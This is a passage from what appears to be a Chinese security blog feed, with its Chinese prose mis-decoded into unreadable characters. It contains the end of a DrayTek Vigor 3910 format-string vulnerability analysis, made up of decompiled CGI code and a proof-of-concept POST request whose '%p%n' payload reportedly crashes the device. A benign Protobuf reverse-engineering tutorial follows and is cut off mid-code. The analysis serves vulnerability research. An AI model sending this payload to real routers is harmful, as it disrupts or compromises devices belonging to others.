<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">*(a4 + <span class="number">0x10</span>LL) = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">if</span> ( getCGI(v54, &amp;v61, v55) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = GetCGIbyFieldName(v53 + <span class="number">56</span>, <span class="string">&quot;fid&quot;</span>);<span class="comment">// fid</span></span><br><span class="line">  v62 = atoi(v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v62 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">      user_login_101(v53 + <span class="number">56</span>);</span><br><span class="line">      resp(*(v54 + <span class="number">0xC</span>LL), <span class="string">&quot;Location: /weblogin.htm\n\n&quot;</span>, <span class="number">256LL</span>);</span><br><span class="line">      <span class="keyword">return</span> res(v53 + <span class="number">56</span>);</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆè·å–ç”¨æˆ·ä¼ é€’çš„ fid å‚æ•°ï¼Œè½¬æ¢æˆ int ç±»å‹ä¹‹åè¿›å…¥ switch å¤„ç†</p>
<p>å½“ fid ç­‰äº 101 æ—¶ï¼Œä¼šè°ƒç”¨ user_login_101 å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">user_login_101</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  v12 = GetCGIbyFieldName(a1, <span class="string">&quot;src_ip&quot;</span>);</span><br><span class="line">  v11 = GetCGIbyFieldName(a1, <span class="string">&quot;target_url&quot;</span>);</span><br><span class="line">  v1 = GetCGIbyFieldName(a1, <span class="string">&quot;mode&quot;</span>);</span><br><span class="line">  v10 = atoi(v1);</span><br><span class="line">  v2 = GetCGIbyFieldName(a1, <span class="string">&quot;fw_set&quot;</span>);</span><br><span class="line">  v9 = atoi(v2);</span><br><span class="line">  v3 = GetCGIbyFieldName(a1, <span class="string">&quot;fw_rule&quot;</span>);</span><br><span class="line">  v8 = atoi(v3);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf1, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf2, <span class="number">0</span>, <span class="number">0xFF</span>uLL);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;buf1, <span class="number">20LL</span>, v12, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(&amp;buf2, <span class="number">255LL</span>, v11, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ˜æ˜¾çœ‹åˆ°æ¼æ´ï¼Œä»£ç ä»ç”¨æˆ·è¯·æ±‚ä¸­è·å– src_ip ç­‰å‚æ•°ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤å°±å°†å…¶ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼ å…¥ snprintf å‡½æ•°ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p>æ„é€ å‡º PoC</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/user_login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Length: 74</span><br><span class="line">Origin: http://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fid=101&amp;src_ip=111&amp;target_url=%25%70%25%6e&amp;mode=1&amp;fw_set=1&amp;fw_rule=1</span><br></pre></td></tr></table></figure></div>

<p>å‘é€åˆ°è®¾å¤‡ååœ¨ç»ˆç«¯è§‚å¯Ÿç³»ç»Ÿå·²ç»å´©æºƒ</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-8.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>ç³»ç»Ÿå´©æºƒ</em></td>
</tr>
</tbody></table>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a class="link"   href="https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf" >https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md" >https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/arnoldlu/p/14175126.html" >https://www.cnblogs.com/arnoldlu/p/14175126.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/391101179" >https://zhuanlan.zhihu.com/p/391101179<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://harmonyhu.com/2018/06/23/Arm-trusted-firmware/#bl1" >https://harmonyhu.com/2018/06/23/Arm-trusted-firmware/#bl1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md" >https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>é€†å‘æ¢å¤ Protobuf å¯¹è±¡ç»“æ„</title>
    <url>/2023/12/14/protobuf/</url>
    <content><![CDATA[<p>ä¸€äº›åœ¨é€†å‘è¿‡ç¨‹ä¸­æ¢å¤ Google Protobuf å¯¹è±¡ç»“æ„çš„æ–¹æ³•ã€‚</p>
<span id="more"></span>

<h2 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h2><p>Protobuf æ˜¯ Google æ¨å‡ºçš„ä¸€æ¬¾å¼€æºè·¨å¹³å°çš„åºåˆ—åŒ–æ•°æ®ç»“æ„çš„åè®®ï¼Œå®ƒåœ¨æ‰§è¡Œæ•ˆç‡ã€å…¼å®¹æ€§ç­‰æ–¹é¢æ¯”è¾ƒä¼˜ç§€ï¼Œåœ¨ Google å†…éƒ¨ä»¥åŠå¾ˆå¤šå¤§å‹é¡¹ç›®ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚</p>
<p>Protobuf çš„åŸºç¡€æ˜¯ proto æ–‡ä»¶ä»¥åŠ protoc ç¼–è¯‘å™¨ï¼Œå¼€å‘è€…æŠŠæƒ³è¦è¿›è¡Œåºåˆ—åŒ–çš„å¯¹è±¡å®šä¹‰æˆ <code>.proto</code> æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨ protoc ç¼–è¯‘æˆå¯¹åº”è¯­è¨€çš„ä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸šåŠ¡ä¸­ä½¿ç”¨ä»£ç æä¾›çš„å„é¡¹æ¥å£æ¥æ“çºµå¯¹è±¡ã€‚å…³äº Protobuf çš„åŸºæœ¬ä½¿ç”¨å¯ä»¥å‚è€ƒ Google å®˜æ–¹æ–‡æ¡£ã€‚</p>
<p>Protobuf çµæ´»é«˜æ•ˆï¼Œåœ¨å¼€å‘æ—¶å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨ï¼Œä½†ä»é€†å‘è§’åº¦æ¥çœ‹ï¼ŒProtobuf åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ä¸€èˆ¬ä»¥äºŒè¿›åˆ¶å½¢å¼ä¿å­˜ï¼Œä¾‹å¦‚æˆ‘ä»¬å®šä¹‰å¦‚ä¸‹ protobuf å¯¹è±¡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;; </span><br><span class="line"> </span><br><span class="line">message ExampleProtobuf</span><br><span class="line">&#123;</span><br><span class="line">    string name = 1;</span><br><span class="line">    int32 price = 2;</span><br><span class="line">    string location = 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å¹¶å°†å…¶åºåˆ—åŒ–</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;apple&quot;,&quot;price&quot;:10,&quot;location&quot;:&quot;A-10&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆä¼šå¾—åˆ°ç»“æœ(HEX ç¼–ç )</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0a 05 61 70 70 6c 65 10 0a 1a 04 41 2d 31 30</span><br></pre></td></tr></table></figure></div>

<p>ç»“æœä¸­å¯ä»¥ç›´è§‚çš„çœ‹åˆ°æˆ‘ä»¬å®šä¹‰çš„å­—ç¬¦ä¸²æ•°æ®ï¼Œä½†æ•°æ®ç±»å‹å’Œåç§°ç­‰ä¿¡æ¯å·²ç»ä¸¢å¤±ï¼Œé’ˆå¯¹æ›´åŠ å¤æ‚çš„å¯¹è±¡åˆ™éš¾ä»¥åˆ†æï¼Œéœ€è¦æŸäº›æ–¹æ³•ä» protoc ç”Ÿæˆçš„ä»£ç ä¸­æ¢å¤æ•°æ®ç»“æ„ã€‚æœ¬æ–‡æˆ‘ä»¬ä¼šå°è¯•ä» JAVAã€Python ä»¥åŠ C++ ä¸‰ç§ä¸åŒè¯­è¨€ä¸­æ¢å¤ Protobuf å¯¹è±¡çš„å®šä¹‰ã€‚</p>
<h2 id="JAVA-ä¸­çš„-Protobuf"><a href="#JAVA-ä¸­çš„-Protobuf" class="headerlink" title="JAVA ä¸­çš„ Protobuf"></a>JAVA ä¸­çš„ Protobuf</h2><p>ä»¥å¼€æºé¡¹ç›® <a class="link"   href="https://github.com/simplesteph/protobuf-example-java" >https://github.com/simplesteph/protobuf-example-java<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸ºä¾‹ï¼Œå°†é¡¹ç›®å…‹éš†åˆ°æœ¬åœ°ï¼Œä½¿ç”¨ IDEA ç¼–è¯‘ï¼Œç„¶åæ‰¾åˆ°ç”Ÿæˆçš„ jar æ–‡ä»¶ä½¿ç”¨ jadx åç¼–è¯‘åˆ†æã€‚</p>
<p>é¦–å…ˆæŸ¥çœ‹ SimpleMessage çš„åŸå§‹å®šä¹‰</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> example.simple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">SimpleMessage</span> &#123;</span><br><span class="line">  <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="type">bool</span> is_simple = <span class="number">2</span>;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="type">int32</span> sample_list = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»å®šä¹‰å¯ä»¥çœ‹åˆ°å®ƒåŒ…å« 4 ä¸ªæˆå‘˜ï¼Œå…¶ä¸­ sample_list æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚</p>
<p>åœ¨ jadx ä¸­æ‰¾åˆ° SimpleMessage çš„å®šä¹‰ï¼Œè™½ç„¶å¯¹è±¡ç»è¿‡ protoc ç¼–è¯‘åå¾—åˆ°çš„æ˜¯æ¯”è¾ƒå¤æ‚çš„æºæ–‡ä»¶ï¼Œä½†å¾—ç›Šäº java çš„åç¼–è¯‘æ•ˆæœï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥å®Œå…¨è¿˜åŸè¿™ä»½æºç ï¼ŒæŸ¥çœ‹åç¼–è¯‘ç»“æœå³å¯æ¸…æ™°çš„çœ‹åˆ°å˜é‡åä»¥åŠå®ƒä»¬çš„ç±»å‹</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> GeneratedMessageV3.<span class="type">FieldAccessorTable</span> <span class="variable">internal_static_example_simple_SimpleMessage_fieldAccessorTable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GeneratedMessageV3</span>.FieldAccessorTable(internal_static_example_simple_SimpleMessage_descriptor, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;Id&quot;</span>, <span class="string">&quot;IsSimple&quot;</span>, <span class="string">&quot;Name&quot;</span>, <span class="string">&quot;SampleList&quot;</span>&#125;);</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">SimpleMessage</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id_ = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.isSimple_ = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.name_ = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.sampleListMemoizedSerializedSize = -<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.memoizedIsInitialized = (<span class="type">byte</span>) -<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.name_ = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.sampleList_ = emptyIntList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»”ç»†è§‚å¯Ÿæºæ–‡ä»¶è¿˜å¯ä»¥å‘ç°ï¼Œå…¶ä¸­å­˜åœ¨è¿™æ ·çš„æ•°æ®ç»“æ„</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        String[] descriptorData = &#123;<span class="string">&quot;\n\fsimple.proto\u0012\u000eexample.simple\&quot;Q\n\rSimpleMessage\u0012\n\n\u0002id\u0018\u0001 \u0001(\u0005\u0012\u0011\n\tis_simple\u0018\u0002 \u0001(\b\u0012\f\n\u0004name\u0018\u0003 \u0001(\t\u0012\u0013\n\u000bsample_list\u0018\u0004 \u0003(\u0005b\u0006proto3&quot;</span>&#125;;</span><br><span class="line">        descriptor = Descriptors.FileDescriptor.internalBuildGeneratedFileFrom(descriptorData, <span class="keyword">new</span> <span class="title class_">Descriptors</span>.FileDescriptor[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>descriptorData æ˜¯ä¸€ä¸ªä¸»è¦ç”±äºŒè¿›åˆ¶å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²ï¼ŒæŸ¥çœ‹èµ„æ–™å¾—çŸ¥å®ƒæ˜¯ç”¨æ¥è¡¨ç¤ºæ¶ˆæ¯ç±»å‹çš„æè¿°ç¬¦ï¼ŒåŒ…å«äº†æ¶ˆæ¯ç±»å‹çš„ç»“æ„åŒ–ä¿¡æ¯ï¼Œä¾‹å¦‚å­—æ®µåç§°ã€ç±»å‹ã€æ ‡ç­¾ç­‰ã€‚è€Œç†è®ºä¸Šå¯ä»¥é€šè¿‡è§£æè¿™ä¸ªæ•°æ®ç»“æ„æ¥è¿˜åŸéƒ¨åˆ†å¯¹è±¡çš„åŸå§‹å®šä¹‰ã€‚</p>
<p><a class="link"   href="https://github.com/marin-m/pbtk" >å¼€æºå·¥å…·<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>å·²ç»å®ç°äº†è¿™éƒ¨åˆ†åŠŸèƒ½ï¼Œä¾‹å¦‚ä½¿ç”¨å·¥å…·ä¸­é™„å¸¦çš„ jar_extract.py è„šæœ¬å¤„ç† jar æ–‡ä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 jar_extract.py protobuf-example-java-1.0-SNAPSHOT.jar extracted</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œåä¼šç”Ÿæˆ 4 ä¸ª proto æ–‡ä»¶ï¼Œå…¶ä¸­ simple.proto æ–‡ä»¶å†…å®¹</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> example.simple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">SimpleMessage</span> &#123;</span><br><span class="line">  <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="type">bool</span> is_simple = <span class="number">2</span>;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="type">int32</span> sample_list = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç»“æœå’ŒåŸå§‹å®šä¹‰å®Œå…¨ä¸€è‡´ã€‚</p>
<p>protobuf æ”¯æŒå¯¹ç¼–è¯‘å¼€å¯ä¼˜åŒ–é€‰é¡¹ï¼Œå…±æœ‰ä¸‰ç§ä¼˜åŒ–çº§åˆ«ï¼ŒSPEEDã€CODE_SIZEã€LITE_RUNTIMEï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œé‡‡ç”¨çš„æ˜¯ SPEED æ¨¡å¼ï¼Œæ­¤æ—¶ç”Ÿæˆçš„ä»£ç æ‰§è¡Œæ•ˆç‡é«˜ï¼Œä½†æ˜¯å ç”¨ç©ºé—´æ›´å¤§ï¼ŒCODE_SIZE æ¨¡å¼å ç”¨ç©ºé—´å°ï¼Œä½†æ˜¯æ‰§è¡Œæ•ˆç‡æ›´ä½ï¼ŒLITE_RUNTIME ç‰ºç‰²äº† protobuf æä¾›çš„åå°„åŠŸèƒ½ä»è€Œå…¼é¡¾æ‰§è¡Œæ•ˆç‡å’Œä»£ç å ç”¨ç©ºé—´ã€‚</p>
<p>å½“é‡‡ç”¨ LITE_RUNTIME æ¨¡å¼ç¼–è¯‘æ—¶ï¼Œæœ€ç»ˆç”Ÿæˆçš„æºä»£ç ä¸­å°†ä¸å†åŒ…å« descriptorData æ•°æ®ï¼Œä¹Ÿå°±ä¸èƒ½ä½¿ç”¨ pbtk è‡ªåŠ¨è¿˜åŸå¯¹è±¡ç»“æ„ã€‚</p>
<p>æˆ‘ä»¬ä»¥æŸ Android APP ä¸ºä¾‹æ¥åˆ†æä¸€ä¸‹å¦‚ä½•è¿˜åŸç¼ºå°‘æè¿°ä¿¡æ¯çš„ protobuf ç»“æ„ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">GetPeerInfoRequest</span> <span class="keyword">extends</span> <span class="title class_">GeneratedMessageLite</span>&lt;GetPeerInfoRequest, b&gt; <span class="keyword">implements</span> <span class="title class_">MessageLiteOrBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BITRATE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> GetPeerInfoRequest DEFAULT_INSTANCE;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEVICE_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">EPISODE_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LIVE_SEGMENT_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MANUSCRIPT_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAT_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Parser&lt;GetPeerInfoRequest&gt; PARSER = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PEER_NEED_COUNT_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PLAY_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_AVID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_SIZE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_TYPE_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RESOURCE_URL_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SEASON_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SEGMENT_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SESSION_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUB_SEGMENT_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TRANS_ID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UPLOAD_PRIORITY_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UPLOAD_UTC_TIMESTAMP_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UP_MID_FIELD_NUMBER</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> bitrate_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> episodeId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> liveSegment_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> manuscriptType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> natType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> peerNeedCount_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> playType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> resourceSize_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> resourceType_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> seasonId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> segmentId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sessionId_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> upMid_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> uploadPriority_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> uploadUtcTimestamp_;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">subSegmentMemoizedSerializedSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">deviceId_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">resourceId_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> Internal.<span class="type">IntList</span> <span class="variable">subSegment_</span> <span class="operator">=</span> GeneratedMessageLite.emptyIntList();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">resourceAvid_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">resourceUrl_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">transId_</span> <span class="operator">=</span> com.redacted.nativelibrary.b.d;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯ä¸€ä¸ªå«åš GetPeerInfoRequest çš„ç±»ï¼Œç»§æ‰¿è‡ª GeneratedMessageLite ç±»ï¼Œå®ç°äº† MessageLiteOrBuilder æ¥å£ï¼ŒMessageLite æ˜¯ protobuf ä¸­æä¾›çš„ç±»ï¼Œå®ƒä¸æ”¯æŒåå°„æœºåˆ¶ï¼Œå› æ­¤ä¹Ÿä¸åŒ…å«æè¿°ä¿¡æ¯ã€‚</p>
<p>è§‚å¯Ÿè¿™ä¸ªç±»ï¼Œå‘ç°å­˜åœ¨å¤§é‡ xxx_FIELD_NUMBER çš„æˆå‘˜ï¼Œå¦å¤–è¿˜å¯ä»¥æ‰¾åˆ°å«åš dynamicMethod çš„å‡½æ•°</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Object <span class="title function_">dynamicMethod</span><span class="params">(GeneratedMessageLite.MethodToInvoke methodToInvoke, Object obj, Object obj2)</span> &#123;</span><br><span class="line">       <span class="keyword">switch</span> (a.a[methodToInvoke.ordinal()]) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GetPeerInfoRequest</span>();</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">b</span>(<span class="literal">null</span>);</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               <span class="keyword">return</span> GeneratedMessageLite.newMessageInfo(DEFAULT_INSTANCE, <span 